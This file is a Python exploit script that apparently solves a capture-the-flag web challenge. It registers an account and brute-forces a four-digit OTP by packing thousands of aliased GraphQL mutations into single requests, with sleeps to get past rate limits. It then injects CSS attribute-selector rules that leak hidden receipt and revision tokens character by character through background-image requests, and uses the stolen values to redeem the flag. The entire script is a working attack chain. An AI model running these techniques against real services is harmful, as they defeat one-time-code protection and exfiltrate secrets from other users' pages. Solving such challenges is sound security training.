#!/usr/bin/env python3
import html
import json
import re
import sys
import time
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from urllib.error import HTTPError


HEX = "0123456789abcdef"
RECEIPT_LEN = 16
REVISION_LEN = 10
RECEIPT_TARGETS = [
    ".avatar-shadow",
    ".avatar-stage",
    ".avatar-body",
    ".avatar-head",
    ".avatar-hair",
    ".eye-left",
    ".eye-right",
    ".avatar-mouth",
    ".avatar-neck",
    ".avatar-jacket",
    ".avatar-shirt",
    ".avatar-tie",
    ".portrait-screen",
    ".avatar-card",
    ".caption-label",
    ".caption-name",
]
REVISION_TARGETS = [
    ".proofing-state",
    ".palette-state",
    ".subject-state",
    ".crop-state",
    ".lighting-state",
    ".contrast-state",
    ".wardrobe-state",
    ".delivery-state",
    ".archive-state",
    ".release-state",
]


class Client:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.jar = CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def request(self, method, path, data=None, json_body=None):
        url = self.base_url + path
        headers = {}
        body = None

        if data is not None:
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        elif json_body is not None:
            body = json.dumps(json_body).encode()
            headers["Content-Type"] = "application/json"

        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        return self.opener.open(req, timeout=20)

    def text(self, method, path, data=None, json_body=None):
        with self.request(method, path, data=data, json_body=json_body) as response:
            return response.read().decode()

    def json(self, method, path, data=None, json_body=None):
        return json.loads(self.text(method, path, data=data, json_body=json_body))


def login(client):
    username, password = register_account(client)
    client.text("POST", "/login", data={"username": username, "password": password})
    return username, password


def register_account(client):
    username = f"team_{int(time.time() * 1000) % 10_000_000}"
    password = f"Pass_{int(time.time() * 1000) % 10_000_000}_wired"
    page = client.text(
        "POST",
        "/register",
        data={
            "username": username,
            "password": password,
            "confirmPassword": password
        },
    )
    if f"Account created for <code>{username}</code>" not in page:
        raise RuntimeError("Failed to register account")
    return username, password


def brute_otp(client):
    try:
        return brute_otp_single_request(client)
    except HTTPError as exc:
        if exc.code != 413:
            raise
        return brute_otp_chunked(client)


def brute_otp_single_request(client):
    fields = []
    for value in range(10000):
        code = f"{value:04d}"
        fields.append(
            f'a{code}: validatePin(input: {{ pin: "{code}", channel: "editorial" }}) {{ ok message }}'
        )

    query = "mutation AliasBrute {" + " ".join(fields) + "}"
    result = client.json("POST", "/graphql", json_body={"query": query})
    return find_successful_otp(result)


def brute_otp_chunked(client, chunk_size=600, wait_s=4.1):
    for start in range(0, 10000, chunk_size):
        fields = []
        for value in range(start, min(start + chunk_size, 10000)):
            code = f"{value:04d}"
            fields.append(
                f'a{code}: validatePin(input: {{ pin: "{code}", channel: "editorial" }}) {{ ok message }}'
            )

        query = "mutation AliasBrute {" + " ".join(fields) + "}"

        try:
            result = client.json("POST", "/graphql", json_body={"query": query})
        except HTTPError as exc:
            if exc.code == 429:
                time.sleep(wait_s)
                result = client.json("POST", "/graphql", json_body={"query": query})
            else:
                raise

        otp = find_successful_otp(result)
        if otp is not None:
            return otp

        time.sleep(wait_s)

    raise RuntimeError("No valid OTP found in chunked GraphQL search")


def find_successful_otp(result):
    if "errors" in result:
        raise RuntimeError(f"GraphQL error: {result['errors'][0]['message']}")

    for alias, entry in result.get("data", {}).items():
        if entry["ok"]:
            return alias[1:]

    return None


def build_css(selector, attr_name, scope, position):
    rules = []
    for char in HEX:
        rules.append(
            f'{selector}[{attr_name}="{char}"]'
            f'{{background-image:url("/r?scope={scope}&p={position}&c={char}")}}'
        )
    return "".join(rules)


def latest_submission_id(client):
    html = client.text("GET", "/dashboard")
    matches = re.findall(r"<span>#(\d+)</span>", html)
    if not matches:
        return 0
    return int(matches[0])


def submit_css(client, css):
    client.text("POST", "/submit", data={"css": css})
    return latest_submission_id(client)


def fetch_logs(client):
    page = client.text("GET", "/telemetry")
    leaks = re.findall(r"<span>submission (\d+)</span>\s*<span>(/r\\?[^<]+)</span>", page)
    return [(submission_id, html.unescape(request_path)) for submission_id, request_path in leaks]


def wait_for_value(client, target_submission_id, scope, expected_len):
    recovered = {}
    deadline = time.time() + 90

    while time.time() < deadline:
        leaks = fetch_logs(client)
        for submission_id, request_path in leaks:
            if int(submission_id) != target_submission_id:
                continue
            parsed = urllib.parse.urlparse(request_path)
            params = urllib.parse.parse_qs(parsed.query)
            if params.get("scope", [""])[0] != scope:
                continue
            position = int(params.get("p", ["0"])[0])
            char = params.get("c", [""])[0]
            if position > 0 and re.fullmatch(r"[0-9a-f]", char):
                recovered[position] = char

        if all(position in recovered for position in range(1, expected_len + 1)):
            return "".join(recovered[position] for position in range(1, expected_len + 1))

        time.sleep(1)

    raise RuntimeError(f"Timed out waiting for all token characters, got: {recovered}")


def redeem_flag(client, submission_id, receipt, revision):
    return client.text(
        "POST",
        "/internal/publish",
        data={
            "submissionId": str(submission_id),
            "receipt": receipt,
            "revision": revision
        },
    ).strip()


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:1337"
    client = Client(base_url)

    print(f"[+] target: {base_url}")
    print("[+] registering and logging in")
    username, password = login(client)
    print(f"[+] account: {username}")
    print(f"[+] password: {password}")

    print("[+] brute-forcing OTP via GraphQL aliases")
    otp = brute_otp(client)
    print(f"[+] OTP recovered: {otp}")

    print("[+] submitting one stylesheet to recover release metadata")
    css = "".join(
        build_css(
            RECEIPT_TARGETS[position - 1],
            "data-proof",
            "receipt",
            position,
        )
        for position in range(1, RECEIPT_LEN + 1)
    )
    css += "".join(
        build_css(
            REVISION_TARGETS[position - 1],
            "data-phase",
            "revision",
            position,
        )
        for position in range(1, REVISION_LEN + 1)
    )
    submission_id = submit_css(client, css)
    print(f"[+] queued submission: {submission_id}")

    print("[+] polling /telemetry for leaked release metadata")
    receipt = wait_for_value(client, submission_id, "receipt", RECEIPT_LEN)
    revision = wait_for_value(client, submission_id, "revision", REVISION_LEN)
    print(f"[+] release receipt: {receipt}")
    print(f"[+] revision stamp: {revision}")

    print("[+] redeeming flag")
    flag_line = redeem_flag(client, submission_id, receipt, revision)
    print(flag_line)


if __name__ == "__main__":
    main()
